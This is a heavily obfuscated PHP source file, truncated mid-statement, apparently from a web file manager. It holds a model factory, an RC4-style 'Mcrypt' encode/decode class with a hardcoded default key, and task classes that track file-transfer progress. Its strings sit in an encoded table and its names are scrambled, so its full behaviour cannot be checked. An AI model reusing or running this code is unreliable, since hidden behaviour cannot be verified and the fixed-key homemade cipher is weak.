<?php
 goto eˆÆÔİÆÀ; cƒñ—Ô…Š: define($_SERVER[İåâé¾][0], $_SERVER[İåâé¾][1]); $_SERVER[•¡£] = explode($_SERVER[İåâé¾][2], gzinflate(substr($_SERVER[İåâé¾][3], 10, -8))); function Model($Fî‰ÆÄèˆ = '', $aÈÀˆ¡¶‰Â = '', $c¾àÏ‡¡š‚ = '') { goto CÆ›Ï„µã¶; c˜Ü·á°¼: if (isset($f§¸øœ‰›ô[$D‚äÒí´À])) { return $f§¸øœ‰›ô[$D‚äÒí´À]; } if ($Fî‰ÆÄèˆ) { $Fî‰ÆÄèˆ = strtoupper($Fî‰ÆÄèˆ[0]) . substr($Fî‰ÆÄèˆ, 1); $D‘±îÏ‹Á¡ = $Fî‰ÆÄèˆ . $DŸÒÔßÓ[1]; if (class_exists($D‘±îÏ‹Á¡)) { $f§¸øœ‰›ô[$D‚äÒí´À] = new $D‘±îÏ‹Á¡(); return $f§¸øœ‰›ô[$D‚äÒí´À]; } } $f§¸øœ‰›ô[$D‚äÒí´À] = new ModelBase($Fî‰ÆÄèˆ, $aÈÀˆ¡¶‰Â, $c¾àÏ‡¡š‚); goto D“¦½Ş©ÂÆ; CÆ›Ï„µã¶: $DŸÒÔßÓ =& $_SERVER[•¡£]; static $f§¸øœ‰›ô = array(); $D‚äÒí´À = strtolower($aÈÀˆ¡¶‰Â . $DŸÒÔßÓ[0] . $Fî‰ÆÄèˆ); goto c˜Ü·á°¼; D“¦½Ş©ÂÆ: return $f§¸øœ‰›ô[$D‚äÒí´À]; goto A¾À“˜ãñ; A¾À“˜ãñ: } goto Eñå¡¸åï¾; b¢…è™‘°: class Mcrypt { public static $default_key = "\x61\x21\164\141\x6b\x41\x3a\x64\x6c\x6d\x63\x6c\144\x45\x76\x2c\145"; public static function encode($côÎ—’øì¬, $BßÈô¹Õì = '', $e®ç–ó´¬ = 0) { goto F»Şš™›Ğ; A˜êÜÏš: $cÄ¬é¨ğÏÁ = range(0, 255); for ($d†ğôæ“Ã© = $D˜ïõ§‡¯ = 0; $D˜ïõ§‡¯ < 256; $D˜ïõ§‡¯++) { $d†ğôæ“Ã© = ($d†ğôæ“Ã© + $cÄ¬é¨ğÏÁ[$D˜ïõ§‡¯] + $cĞ­°â Ë[$D˜ïõ§‡¯]) % 256; $EÜˆÛ¬£Û = $cÄ¬é¨ğÏÁ[$D˜ïõ§‡¯]; $cÄ¬é¨ğÏÁ[$D˜ïõ§‡¯] = $cÄ¬é¨ğÏÁ[$d†ğôæ“Ã©]; $cÄ¬é¨ğÏÁ[$d†ğôæ“Ã©] = $EÜˆÛ¬£Û; } $aÚè«Šåø = $aĞ­ˆÅØ[33]; goto cØ²Î­‰¼; DÀ ¿Õä´¡: $AÃ•ÕœøŞ = strlen($côÎ—’øì¬); $cĞ­°â Ë = array(); for ($D˜ïõ§‡¯ = 0; $D˜ïõ§‡¯ <= 255; $D˜ïõ§‡¯++) { $cĞ­°â Ë[$D˜ïõ§‡¯] = ord($eòóÁŸÛÍ[$D˜ïõ§‡¯ % $D”»í­»„]); } goto A˜êÜÏš; F»Şš™›Ğ: $aĞ­ˆÅØ =& $_SERVER[İåâé¾]; $Eª•º¤âÒç = 4; $BßÈô¹Õì = md5($BßÈô¹Õì ? $BßÈô¹Õì : self::$default_key); goto F˜¥®Õ×Õ‡; aøËŒâÓÙÁ: $eòóÁŸÛÍ = $eÃÙ¥‰ææº . md5($eÃÙ¥‰ææº . $F¯šè‹ë‡»); $D”»í­»„ = strlen($eòóÁŸÛÍ); $côÎ—’øì¬ = sprintf($aĞ­ˆÅØ[1324], $e®ç–ó´¬ ? $e®ç–ó´¬ + time() : 0) . substr(md5($côÎ—’øì¬ . $aî±¬Œ×¸ë), 0, 16) . $côÎ—’øì¬; goto DÀ ¿Õä´¡; F˜¥®Õ×Õ‡: $eÃÙ¥‰ææº = md5(substr($BßÈô¹Õì, 0, 16)); $aî±¬Œ×¸ë = md5(substr($BßÈô¹Õì, 16, 16)); $F¯šè‹ë‡» = substr(md5(microtime()), -$Eª•º¤âÒç); goto aøËŒâÓÙÁ; cØ²Î­‰¼: for ($d©¿É½Š´È = $d†ğôæ“Ã© = $D˜ïõ§‡¯ = 0; $D˜ïõ§‡¯ < $AÃ•ÕœøŞ; $D˜ïõ§‡¯++) { $d©¿É½Š´È = ($d©¿É½Š´È + 1) % 256; $d†ğôæ“Ã© = ($d†ğôæ“Ã© + $cÄ¬é¨ğÏÁ[$d©¿É½Š´È]) % 256; $EÜˆÛ¬£Û = $cÄ¬é¨ğÏÁ[$d©¿É½Š´È]; $cÄ¬é¨ğÏÁ[$d©¿É½Š´È] = $cÄ¬é¨ğÏÁ[$d†ğôæ“Ã©]; $cÄ¬é¨ğÏÁ[$d†ğôæ“Ã©] = $EÜˆÛ¬£Û; $aÚè«Šåø .= chr(ord($côÎ—’øì¬[$D˜ïõ§‡¯]) ^ $cÄ¬é¨ğÏÁ[($cÄ¬é¨ğÏÁ[$d©¿É½Š´È] + $cÄ¬é¨ğÏÁ[$d†ğôæ“Ã©]) % 256]); } $aÚè«Šåø = $F¯šè‹ë‡» . str_replace($aĞ­ˆÅØ[673], $aĞ­ˆÅØ[33], base64_encode($aÚè«Šåø)); $aÚè«Šåø = str_replace(array($aĞ­ˆÅØ[287], $aĞ­ˆÅØ[8], $aĞ­ˆÅØ[673]), array($aĞ­ˆÅØ[498], $aĞ­ˆÅØ[71], $aĞ­ˆÅØ[90]), $aÚè«Šåø); goto b£¹«Ë»£‹; b£¹«Ë»£‹: return $aÚè«Šåø; goto aÅŠ³Ûø; aÅŠ³Ûø: } public static function decode($D³á¨ÒÉôÇ, $cÚÌƒˆ…½Ï = '') { goto BÄƒÔ¸¥õ§; BÄƒÔ¸¥õ§: $A”ë£¿®ó‘ =& $_SERVER[İåâé¾]; $D³á¨ÒÉôÇ = str_replace(array($A”ë£¿®ó‘[498], $A”ë£¿®ó‘[71], $A”ë£¿®ó‘[90]), array($A”ë£¿®ó‘[287], $A”ë£¿®ó‘[8], $A”ë£¿®ó‘[673]), $D³á¨ÒÉôÇ); $F‡Š¿±®‚ = 4; goto b“®Äº´â; Fáñ†¯”‹é: $eµ›ù—ĞÒæ = $A”ë£¿®ó‘[33]; for ($d¼™æµ = $BŠ«ÀÀ•á” = $E„§ÚÚÙÚÒ = 0; $E„§ÚÚÙÚÒ < $b×Äæ¡¿¯; $E„§ÚÚÙÚÒ++) { $d¼™æµ = ($d¼™æµ + 1) % 256; $BŠ«ÀÀ•á” = ($BŠ«ÀÀ•á” + $bˆÏçùê”Ó[$d¼™æµ]) % 256; $fÁ´‡»İ—¿ = $bˆÏçùê”Ó[$d¼™æµ]; $bˆÏçùê”Ó[$d¼™æµ] = $bˆÏçùê”Ó[$BŠ«ÀÀ•á”]; $bˆÏçùê”Ó[$BŠ«ÀÀ•á”] = $fÁ´‡»İ—¿; $eµ›ù—ĞÒæ .= chr(ord($D³á¨ÒÉôÇ[$E„§ÚÚÙÚÒ]) ^ $bˆÏçùê”Ó[($bˆÏçùê”Ó[$d¼™æµ] + $bˆÏçùê”Ó[$BŠ«ÀÀ•á”]) % 256]); } if ((substr($eµ›ù—ĞÒæ, 0, 10) == 0 || substr($eµ›ù—ĞÒæ, 0, 10) - time() > 0) && substr($eµ›ù—ĞÒæ, 10, 16) == substr(md5(substr($eµ›ù—ĞÒæ, 26) . $a¾Ò…ôàêÓ), 0, 16)) { return substr($eµ›ù—ĞÒæ, 26); } else { return $A”ë£¿®ó‘[33]; } goto E‘îÉ²È—ˆ; e»ó•â¢·Ÿ: $D³á¨ÒÉôÇ = base64_decode(substr($D³á¨ÒÉôÇ, $F‡Š¿±®‚)); $b×Äæ¡¿¯ = strlen($D³á¨ÒÉôÇ); $d½ã…îˆŒ = array(); goto D™Ê¹ÍÇ÷; D™Ê¹ÍÇ÷: for ($E„§ÚÚÙÚÒ = 0; $E„§ÚÚÙÚÒ <= 255; $E„§ÚÚÙÚÒ++) { $d½ã…îˆŒ[$E„§ÚÚÙÚÒ] = ord($D’¿×êç±¯[$E„§ÚÚÙÚÒ % $eµê¿·˜è‘]); } $bˆÏçùê”Ó = range(0, 255); for ($BŠ«ÀÀ•á” = $E„§ÚÚÙÚÒ = 0; $E„§ÚÚÙÚÒ < 256; $E„§ÚÚÙÚÒ++) { $BŠ«ÀÀ•á” = ($BŠ«ÀÀ•á” + $bˆÏçùê”Ó[$E„§ÚÚÙÚÒ] + $d½ã…îˆŒ[$E„§ÚÚÙÚÒ]) % 256; $fÁ´‡»İ—¿ = $bˆÏçùê”Ó[$E„§ÚÚÙÚÒ]; $bˆÏçùê”Ó[$E„§ÚÚÙÚÒ] = $bˆÏçùê”Ó[$BŠ«ÀÀ•á”]; $bˆÏçùê”Ó[$BŠ«ÀÀ•á”] = $fÁ´‡»İ—¿; } goto Fáñ†¯”‹é; f¦¢ñÓä„ë: $fš†´ñ„ˆ = substr($D³á¨ÒÉôÇ, 0, $F‡Š¿±®‚); $D’¿×êç±¯ = $BÙåãÃåÛ­ . md5($BÙåãÃåÛ­ . $fš†´ñ„ˆ); $eµê¿·˜è‘ = strlen($D’¿×êç±¯); goto e»ó•â¢·Ÿ; b“®Äº´â: $cÚÌƒˆ…½Ï = md5($cÚÌƒˆ…½Ï ? $cÚÌƒˆ…½Ï : self::$default_key); $BÙåãÃåÛ­ = md5(substr($cÚÌƒˆ…½Ï, 0, 16)); $a¾Ò…ôàêÓ = md5(substr($cÚÌƒˆ…½Ï, 16, 16)); goto f¦¢ñÓä„ë; E‘îÉ²È—ˆ: } } define($_SERVER[İåâé¾][1325], 1); define($_SERVER[İåâé¾][1326], 2); goto B‘ª ñçØ; Bâ§ÅÆ¥¢: class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\162\165\x6e\x6e\151\156\x67"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($B’Ê¯ÑÉ¾Ò, $AÊÙ¡‹°î = '', $fĞŠ¸Àá¾ = 0, $EÜ×³ƒ© = '') { goto Dæ»™Œ°«; Dæ»™Œ°«: $B’Óùô×Ï¤ =& $_SERVER[İåâé¾]; if (self::get($B’Ê¯ÑÉ¾Ò)) { return; } $this->task = array($B’Óùô×Ï¤[368] => $B’Ê¯ÑÉ¾Ò, $B’Óùô×Ï¤[1086] => USER_ID, $B’Óùô×Ï¤[996] => $EÜ×³ƒ©, $B’Óùô×Ï¤[29] => $AÊÙ¡‹°î, $B’Óùô×Ï¤[1087] => $B’Óùô×Ï¤[33], $B’Óùô×Ï¤[1088] => $fĞŠ¸Àá¾, $B’Óùô×Ï¤[1089] => 0, $B’Óùô×Ï¤[1090] => 0, $B’Óùô×Ï¤[1091] => 0, $B’Óùô×Ï¤[1092] => timeFloat(), $B’Óùô×Ï¤[1093] => 0, $B’Óùô×Ï¤[1094] => 0, $B’Óùô×Ï¤[1095] => 0, $B’Óùô×Ï¤[1096] => 0, $B’Óùô×Ï¤[446] => $B’Óùô×Ï¤[1051]); goto AÖµ½¦Ì‚î; AÖµ½¦Ì‚î: Hook::bind($B’Óùô×Ï¤[1053], array($this, $B’Óùô×Ï¤[1097])); Hook::bind($B’Óùô×Ï¤[1098], array($this, $B’Óùô×Ï¤[1099])); $this->startAfter(); goto FìÉŠÕœ; FìÉŠÕœ: $this->task[$B’Óùô×Ï¤[1094]] = timeFloat(); self::valueSet($this->task[$B’Óùô×Ï¤[368]], $this->task); goto eÙäÏÑ×ÊÏ; eÙäÏÑ×ÊÏ: } public function end() { goto bÒÆ²§Ñ„ˆ; E‰–ªö¬éŠ: Hook::unbind($b„Ÿ†¥ùŒã[1098], array($this, $b„Ÿ†¥ùŒã[1099])); $this->endAfter(); $this->task = !1; goto Eä•µŠ¬†Œ; DÌ¼¶Óµ: $b¦òŒ‡÷© = timeFloat() - $this->task[$b„Ÿ†¥ùŒã[1092]]; self::log($b„Ÿ†¥ùŒã[1100] . $this->task[$b„Ÿ†¥ùŒã[368]] . $b„Ÿ†¥ùŒã[1101] . $b¦òŒ‡÷© . $b„Ÿ†¥ùŒã[1102]); Hook::unbind($b„Ÿ†¥ùŒã[1053], array($this, $b„Ÿ†¥ùŒã[1097])); goto E‰–ªö¬éŠ; bÒÆ²§Ñ„ˆ: $b„Ÿ†¥ùŒã =& $_SERVER[İåâé¾]; if (!$this->task) { return; } if ($this->task[$b„Ÿ†¥ùŒã[1094]]) { self::valueSet($this->task[$b„Ÿ†¥ùŒã[368]], !1); } goto DÌ¼¶Óµ; Eä•µŠ¬†Œ: } public function update($C“ˆœ¦ÃÇì = 0) { goto FÇó†¦Šİ´; A»¾ù…ä±·: if ($B‰èË±š«ë == self::STATYS_KILL) { $C˜Ñ•„šÂ = array($cç×ïâ£ƒ‰[1103] => LNG($cç×ïâ£ƒ‰[1104]), $cç×ïâ£ƒ‰[780] => !1); Cache::set($cç×ïâ£ƒ‰[1105] . $this->task[$cç×ïâ£ƒ‰[368]], $C˜Ñ•„šÂ, 30); $this->end(); die; } else { if ($B‰èË±š«ë == self::STATYS_STOP) { $FÉõô´õìö = 2; $añ–ĞÉ›Óœ[$cç×ïâ£ƒ‰[1095]] += $FÉõô´õìö; self::valueSet($CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[368]], $añ–ĞÉ›Óœ); sleep($FÉõô´õìö); $this->update(); return; } } $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[446]] = $B‰èË±š«ë ? $B‰èË±š«ë : $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[446]]; $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1095]] = $añ–ĞÉ›Óœ[$cç×ïâ£ƒ‰[1095]] ? $añ–ĞÉ›Óœ[$cç×ïâ£ƒ‰[1095]] : 0; goto e½ÛØµŸ‚¦; FÇó†¦Šİ´: $cç×ïâ£ƒ‰ =& $_SERVER[İåâé¾]; $CÚÚÎÖ¨²ô =& $this->task; if (!$CÚÚÎÖ¨²ô) { return; } goto e·‰Ñ–™Õ; B‡åòåÒ“è: self::cacheClear(); $añ–ĞÉ›Óœ = self::get($CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[368]]); $B‰èË±š«ë = $añ–ĞÉ›Óœ[$cç×ïâ£ƒ‰[446]]; goto A»¾ù…ä±·; e·‰Ñ–™Õ: $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1089]] += $C“ˆœ¦ÃÇì; $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1093]] = timeFloat(); if ($CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1088]]) { $e³¨É¤¹© = timeFloat() - $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1092]] - $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1095]]; $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1090]] = $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1089]] / $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1088]]; $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1091]] = $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1089]] / $e³¨É¤¹©; if ($CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1090]] > 0) { $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1096]] = $e³¨É¤¹© * (1 - $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1090]]) / $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1090]]; } } goto dÃŠ¢ê¿²¸; dÃŠ¢ê¿²¸: $this->updateAfter(); $D¸ÌçëÌæ = 0.2; if (timeFloat() - $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1094]] < $D¸ÌçëÌæ) { return; } goto B‡åòåÒ“è; e½ÛØµŸ‚¦: $CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[1094]] = timeFloat(); self::valueSet($CÚÚÎÖ¨²ô[$cç×ïâ£ƒ‰[368]], $CÚÚÎÖ¨²ô); goto bÜ—°ÒóÕ¬; bÜ—°ÒóÕ¬: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($EµºÀËÑñ­) { $F¾ˆä”Ñ¼“ =& $_SERVER[İåâé¾]; Cache::set($F¾ˆä”Ñ¼“[1105] . $this->task[$F¾ˆä”Ñ¼“[368]], $EµºÀËÑñ­, 30); return $EµºÀËÑñ­; } public static function get($e••Š£ƒƒ) { return self::valueGet($e••Š£ƒƒ); } public static function listData($C¯ÉÀÈ‡‡Û = false) { $CôìÍ‚Š…ª =& $_SERVER[İåâé¾]; $bÓ“ÇÒæ Å = self::valueGet(); if ($C¯ÉÀÈ‡‡Û) { $bÓ“ÇÒæ Å = array_filter_by_field($bÓ“ÇÒæ Å, $CôìÍ‚Š…ª[1086], $C¯ÉÀÈ‡‡Û); } $bÓ“ÇÒæ Å = array_sort_by($bÓ“ÇÒæ Å, $CôìÍ‚Š…ª[1092], !0); return $bÓ“ÇÒæ Å; } public static function kill($D¯Øíç¾Â) { return self::changeStatus($D¯Øíç¾Â, self::STATYS_KILL); } public static function stop($Bñİê¼îè) { return self::changeStatus($Bñİê¼îè, self::STATYS_STOP); } public static function restart($eÂÒ£ã–‰¹) { return self::changeStatus($eÂÒ£ã–‰¹, self::STATYS_RUNNING); } public static function killAll() { $AÛƒ‰ôºµ´ =& $_SERVER[İåâé¾]; $BÉİãÏìÀÖ = self::listData(); foreach ($BÉİãÏìÀÖ as $d·‘´ÖÁêÌ) { self::kill($d·‘´ÖÁêÌ[$AÛƒ‰ôºµ´[368]]); } sleep(2); foreach ($BÉİãÏìÀÖ as $d·‘´ÖÁêÌ) { self::valueSet($d·‘´ÖÁêÌ[$AÛƒ‰ôºµ´[368]], !1); } } private static function changeStatus($DÂ“Âçìêæ, $b”«Ü†ö’) { goto cœ…§Ç¥’İ; F¦ˆ…ö¶¥×: $fÃÜ˜Â†…‚[$e±ˆ½ä‘¾ö[446]] = $b”«Ü†ö’; self::valueSet($DÂ“Âçìêæ, $fÃÜ˜Â†…‚); self::log($e±ˆ½ä‘¾ö[1106] . $fÃÜ˜Â†…‚[$e±ˆ½ä‘¾ö[368]] . $e±ˆ½ä‘¾ö[1107] . $b”«Ü†ö’); goto C…î³å«´Î; cœ…§Ç¥’İ: $e±ˆ½ä‘¾ö =& $_SERVER[İåâé¾]; $fÃÜ˜Â†…‚ = self::valueGet($DÂ“Âçìêæ); if (!$fÃÜ˜Â†…‚) { return !1; } goto F¦ˆ…ö¶¥×; C…î³å«´Î: return !0; goto eìÔß…¶à‡; eìÔß…¶à‡: } public static function valueGet($d§ÓÀ•×èÏ = false) { $e‰øÑ©íù =& $_SERVER[İåâé¾]; $Eºğ™Û¶’ = $e‰øÑ©íù[1108]; $b¬Áô–ãñ… = Model($e‰øÑ©íù[1084])->get($d§ÓÀ•×èÏ, $Eºğ™Û¶’); if ($d§ÓÀ•×èÏ) { $b¬Áô–ãñ… = $b¬Áô–ãñ… ? json_decode($b¬Áô–ãñ…, !0) : !1; } else { $b¬Áô–ãñ… = $b¬Áô–ãñ… ? $b¬Áô–ãñ… : array(); foreach ($b¬Áô–ãñ… as $C•›¥§ôº => $FŒ¹ƒá¨óÖ) { $b¬Áô–ãñ…[$C•›¥§ôº] = json_decode($FŒ¹ƒá¨óÖ, !0); } } return $b¬Áô–ãñ…; } public static function valueSet($Dİ®„ç¥Á´, $c†Õ†ÜåïÏ) { goto B…æ›ôƒ¾ª; CÆÁÇ¶ƒ–Ğ: return Model($fåÁÏÕ„íœ[1084])->set($Dİ®„ç¥Á´, $EÏŸğ³­©¶, $BÄ¤ƒ†§Ö); goto aª­ç‹Íõ; fòáÖ–‡’É: $EÏŸğ³­©¶ = json_encode($c†Õ†ÜåïÏ); if (!$EÏŸğ³­©¶) { ob_start(); var_dump($c†Õ†ÜåïÏ); $DøŠçÃøğ = ob_get_clean(); self::log($fåÁÏÕ„íœ[1109] . json_encode_force($DøŠçÃøğ)); } if (!$Dİ®„ç¥Á´ || !$c†Õ†ÜåïÏ[$fåÁÏÕ„íœ[368]]) { return !1; } goto CÆÁÇ¶ƒ–Ğ; B…æ›ôƒ¾ª: $fåÁÏÕ„íœ =& $_SERVER[İåâé¾]; $BÄ¤ƒ†§Ö = $fåÁÏÕ„íœ[1108]; if (!$c†Õ†ÜåïÏ) { return Model($fåÁÏÕ„íœ[1084])->remove($Dİ®„ç¥Á´, $BÄ¤ƒ†§Ö); } goto fòáÖ–‡’É; aª­ç‹Íõ: } public static function cacheClear() { $F…ùóƒ“Ëï =& $_SERVER[İåâé¾]; $bÌ¦È«±˜Ü = Model($F…ùóƒ“Ëï[1084])->cacheKey($F…ùóƒ“Ëï[1108]); Cache::clearMemory($bÌ¦È«±˜Ü); } public static function log($BœìÑâå•½) { write_log($BœìÑâå•½, $_SERVER[İåâé¾][1110]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto c›İ™Ú¶Ğç; c×¤×áíÏ©: $F¬º¢†ôØÁ[$a¨í—Ğé°[1124]] = LNG($a¨í—Ğé°[1125]); $F¬º¢†ôØÁ[$a¨í—Ğé°[1126]] = 0; $F¬º¢†ôØÁ[$a¨í—Ğé°[1127]] = 0; goto a¿Ñ¾Ò’×œ; c›İ™Ú¶Ğç: $a¨í—Ğé° =& $_SERVER[İåâé¾]; $F¬º¢†ôØÁ =& $this->task; $this->sourceCopyFolder = !1; goto aÂŞ­¢¨¶£; cãÊÃ¦°â‰: if (!$F¬º¢†ôØÁ[$a¨í—Ğé°[996]]) { $F¬º¢†ôØÁ[$a¨í—Ğé°[996]] = LNG($a¨í—Ğé°[1130]); } goto Bš‰‰¦İª›; FÓŒË­äÏÅ: Hook::bind($a¨í—Ğé°[423], array($this, $a¨í—Ğé°[1116])); Hook::bind($a¨í—Ğé°[425], array($this, $a¨í—Ğé°[1117])); Hook::bind($a¨í—Ğé°[426], array($this, $a¨í—Ğé°[1117])); goto D®ÏòîË®Š; D®ÏòîË®Š: Hook::bind($a¨í—Ğé°[1118], array($this, $a¨í—Ğé°[1119])); Hook::bind($a¨í—Ğé°[1120], array($this, $a¨í—Ğé°[1121])); Hook::bind($a¨í—Ğé°[1122], array($this, $a¨í—Ğé°[1123])); goto c×¤×áíÏ©; a¿Ñ¾Ò’×œ: $F¬º¢†ôØÁ[$a¨í—Ğé°[1087]] = $a¨í—Ğé°[33]; $F¬º¢†ôØÁ[$a¨í—Ğé°[1128]] = $a¨í—Ğé°[33]; $F¬º¢†ôØÁ[$a¨í—Ğé°[1129]] = 0; goto cãÊÃ¦°â‰; aÂŞ­¢¨¶£: Hook::bind($a¨í—Ğé°[1111], array($this, $a¨í—Ğé°[1112])); Hook::bind($a¨í—Ğé°[1113], array($this, $a¨í—Ğé°[1114])); Hook::bind($a¨í—Ğé°[422], array($this, $a¨í—Ğé°[1115])); goto FÓŒË­äÏÅ; Bš‰‰¦İª›: } protected function endAfter() { $A…×ëÆ½Ş± =& $_SERVER[İåâé¾]; Hook::unbind($A…×ëÆ½Ş±[1111], array($this, $A…×ëÆ½Ş±[1112])); Hook::unbind($A…×ëÆ½Ş±[1113], array($this, $A…×ëÆ½Ş±[1114])); Hook::unbind($A…×ëÆ½Ş±[1118], array($this, $A…×ëÆ½Ş±[1119])); Hook::unbind($A…×ëÆ½Ş±[1120], array($this, $A…×ëÆ½Ş±[1121])); Hook::unbind($A…×ëÆ½Ş±[1122], array($this, $A…×ëÆ½Ş±[1123])); } public function updateAfter() { goto aà„Í”¾£ø; C‡ÖËìøòš: if ($B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1090]] > 0) { $e‘á¢˜’Ÿ = timeFloat() - $B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1092]] - $B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1095]]; $B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1096]] = $e‘á¢˜’Ÿ * (1 - $B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1090]]) / $B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1090]]; } goto dìº÷í› ô; Bõ„œÀíéÉ: $Aø•Ğ‘Ä‡ = 0; if ($B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1128]] == $BÂ›‚æ´ÚÒ[788]) { $Aø•Ğ‘Ä‡ = $B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1127]] * 0.5; } else { if ($B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1128]] == $BÂ›‚æ´ÚÒ[101]) { $Aø•Ğ‘Ä‡ = $B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1127]] * 0.5 + $B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1126]] * 0.5; } } $B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1090]] = ($B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[1131]] + $Aø•Ğ‘Ä‡) / $B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[455]]; goto C‡ÖËìøòš; aà„Í”¾£ø: $BÂ›‚æ´ÚÒ =& $_SERVER[İåâé¾]; $B¶˜¸®ã‰Å =& $this->task; if (!$B¶˜¸®ã‰Å[$BÂ›‚æ´ÚÒ[455]]) { return; } goto Bõ„œÀíéÉ; dìº÷í› ô: } public function addPath($B™Â§”Åõ) { goto aÙÕ¾éêÀ; eƒ´•“øÎ¯: if (!$eÕ»ŸçÅ”ô[$e®ê¤¡šËØ[1132]]) { $eÕ»ŸçÅ”ô[$e®ê¤¡šËØ[1132]] = array(); } $eÕ»ŸçÅ”ô[$e®ê¤¡šËØ[1132]][] = array($e®ê¤¡šËØ[387] => $Fò‡ÂÛíÛ[$e®ê¤¡šËØ[28]], $e®ê¤¡šËØ[76] => $Fò‡ÂÛíÛ[$e®ê¤¡šËØ[76]], $e®ê¤¡šËØ[773] => $Fò‡ÂÛíÛ[$e®ê¤¡šËØ[773]] ? $Fò‡ÂÛíÛ[$e®ê¤¡šËØ[773]] : $Fò‡ÂÛíÛ[$e®ê¤¡šËØ[76]]); if ($Fò‡ÂÛíÛ[$e®ê¤¡šËØ[29]] == $e®ê¤¡šËØ[163]) { $eÕ»ŸçÅ”ô[$e®ê¤¡šËØ[1088]] += 1; } else { $eÕ»ŸçÅ”ô[$e®ê¤¡šËØ[1088]] += $Fò‡ÂÛíÛ[$e®ê¤¡šËØ[81]][$e®ê¤¡šËØ[79]]; } goto D¿ äêôƒ‡; D¿ äêôƒ‡: $eÕ»ŸçÅ”ô[$e®ê¤¡šËØ[455]] += $Fò‡ÂÛíÛ[$e®ê¤¡šËØ[78]]; $this->update(); goto dÜ¢‚‰‘Èá; aÙÕ¾éêÀ: $e®ê¤¡šËØ =& $_SERVER[İåâé¾]; $eÕ»ŸçÅ”ô =& $this->task; $Fò‡ÂÛíÛ = IO::infoWithChildren($B™Â§”Åõ); goto eƒ´•“øÎ¯; dÜ¢‚‰‘Èá: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($d°ÃÍÊ¹»Ç) { $d¶Ó¹¿“©± =& $_SERVER[İåâé¾]; $cô˜Šï·— =& $this->task; $cô˜Šï·—[$d¶Ó¹¿“©±[1124]] = $d°ÃÍÊ¹»Ç[$d¶Ó¹¿“©±[28]]; $cô˜Šï·—[$d¶Ó¹¿“©±[1087]] = $d°ÃÍÊ¹»Ç[$d¶Ó¹¿“©±[28]]; $this->update(); } public function copyFileStart($aŸ³„ÜÇ“Ô, $C«‰Öìæ¤, $AÈö”Ç×èµ, $a¼ˆ…å¯Î°, $AİÔ——¦‰, $e²Øõ¶ÚŠ¥) { goto b±ƒµƒ·¨®; d®İÙÀ¿Óø: $GLOBALS[$e•“ŒîñĞœ[1134]] = $AİÔ——¦‰; $GLOBALS[$e•“ŒîñĞœ[1133]] = $e²Øõ¶ÚŠ¥; $A‹ëè±áË =& $this->task; goto d«ÕƒŞ—„æ; d«ÕƒŞ—„æ: $A‹ëè±áË[$e•“ŒîñĞœ[1124]] = $bàƒ”º§¶‹; $A‹ëè±áË[$e•“ŒîñĞœ[1126]] = (int) $aŸ³„ÜÇ“Ô->size($C«‰Öìæ¤); $A‹ëè±áË[$e•“ŒîñĞœ[1127]] = 0; goto eª‹ÕÙÜÔÔ; Bïë¡Ü‚ë: $this->update(); goto Cíƒ°¬¦Ñ; b±ƒµƒ·¨®: $e•“ŒîñĞœ =& $_SERVER[İåâé¾]; $bàƒ”º§¶‹ = $AİÔ——¦‰; if ($bàƒ”º§¶‹ == $GLOBALS[$e•“ŒîñĞœ[1133]]) { $bàƒ”º§¶‹ = $GLOBALS[$e•“ŒîñĞœ[1134]]; } goto d®İÙÀ¿Óø; eª‹ÕÙÜÔÔ: $A‹ëè±áË[$e•“ŒîñĞœ[1087]] = $e•“ŒîñĞœ[33]; $A‹ëè±áË[$e•“ŒîñĞœ[1128]] = $e•“ŒîñĞœ[33]; $A‹ëè±áË[$e•“ŒîñĞœ[1129]] = 0; goto Bïë¡Ü‚ë; Cíƒ°¬¦Ñ: } public function copyFileEnd($c‚ÏØÊí÷ì, $cÛÃÁ³õè¸, $AÀˆ³…“µİ, $DÂ‡³òõ”§, $A™ÕÅÅ«º¾, $B™ÊŸøÒñ) { $dÏ ©Ä¥á¡ =& $_SERVER[İåâé¾]; $eêÚ„¾Ø³” =& $this->task; $eêÚ„¾Ø³”[$dÏ ©Ä¥á¡[1127]] = 